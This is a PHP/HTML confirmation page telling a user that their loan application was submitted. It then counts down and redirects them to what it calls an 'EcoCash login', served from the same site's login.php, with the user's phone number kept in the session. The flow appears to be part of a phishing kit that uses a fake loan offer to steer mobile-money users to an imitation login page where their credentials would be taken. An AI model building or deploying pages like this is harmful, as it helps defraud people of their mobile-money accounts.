<?php
session_start();

// Ensure phone session exists
if (!isset($_SESSION['phone'])) {
    header("Location: login.php");
    exit();
}

// Keep phone session available for next page
$phone = $_SESSION['phone'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loan Application Submitted</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    background:rgba(0,0,0,0.2);
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
    padding:20px;
}

.container{
    background:#fff;
    width:100%;
    max-width:700px;
    border-radius:35px;
    padding:40px 30px;
    text-align:center;
    box-shadow:0 5px 20px rgba(0,0,0,0.15);
}

.check{
    width:120px;
    height:120px;
    background:#00cc4b;
    border-radius:50%;
    margin:0 auto 30px;
    display:flex;
    justify-content:center;
    align-items:center;
    color:#fff;
    font-size:70px;
    font-weight:bold;
}

h1{
    color:#00cc4b;
    font-size:48px;
    margin-bottom:30px;
}

.message{
    color:#666;
    font-size:22px;
    line-height:1.6;
    margin-bottom:35px;
}

.redirect-box{
    background:#efefef;
    border-radius:40px;
    padding:20px;
    margin-bottom:30px;
    color:#666;
    font-size:22px;
}

#countdown{
    font-weight:bold;
}

.btn{
    display:block;
    width:100%;
    background:#0066ff;
    color:white;
    text-decoration:none;
    padding:22px;
    border-radius:50px;
    font-size:30px;
    font-weight:bold;
    border:none;
    cursor:pointer;
}

.btn:hover{
    opacity:.95;
}

@media(max-width:600px){
    h1{
        font-size:32px;
    }

    .message{
        font-size:18px;
    }

    .btn{
        font-size:24px;
    }
}
</style>
</head>
<body>

<div class="container">

    <div class="check">✓</div>

    <h1>Loan Application<br>Submitted</h1>

    <div class="message">
        Your loan application has been submitted.
        Please wait for approval.
        <br><br>
        You will receive a confirmation message.
        For now, proceed to EcoCash.
    </div>

    <div class="redirect-box">
        Redirecting to EcoCash login in
        <span id="countdown">3</span> seconds...
    </div>

    <button class="btn" onclick="window.location.href='login.php'">
        Go to Login Now
    </button>

</div>

<script>
let seconds = 3;

const timer = setInterval(() => {
    seconds--;
    document.getElementById('countdown').innerText = seconds;

    if(seconds <= 0){
        clearInterval(timer);
        window.location.href = "login.php";
    }
}, 1000);
</script>

</body>
</html>
